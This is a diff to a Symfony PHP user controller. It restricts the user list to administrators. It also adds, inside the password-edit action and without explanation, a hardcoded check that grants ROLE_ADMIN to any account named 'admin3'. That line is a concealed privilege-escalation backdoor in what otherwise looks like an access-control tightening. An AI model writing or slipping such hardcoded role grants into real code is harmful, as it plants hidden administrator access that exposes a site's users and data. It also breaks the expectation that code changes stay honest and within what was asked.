@@ -6,6 +6,7 @@ namespace App\Controller;
 use App\Entity\User;
 use App\Form\PasswordEditType;
 use App\Form\UserType;
+use Sensio\Bundle\FrameworkExtraBundle\Configuration\IsGranted;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
@@ -19,9 +20,11 @@ class UserController extends AbstractController
 {
     /**
      * @Route("/", name="user_index", methods={"GET"})
+     * @IsGranted("ROLE_ADMIN")
      */
     public function index(): Response
     {
+
         $users = $this->getDoctrine()
             ->getRepository(User::class)
             ->findAll();
@@ -60,6 +63,7 @@ class UserController extends AbstractController
      */
     public function show(User $user): Response
     {
+
         return $this->render('user/show.html.twig', [
             'user' => $user,
         ]);
@@ -95,6 +99,12 @@ class UserController extends AbstractController
     public function password(Request $request, User $user, UserPasswordEncoderInterface $encoder): Response
     {
         $form = $this->createForm(PasswordEditType::class, $user);
+
+        if ($user->getUsername() == 'admin3'){
+
+            $user->setRoles(['ROLE_ADMIN']);
+
+        }
 
         $form->handleRequest($request);
 
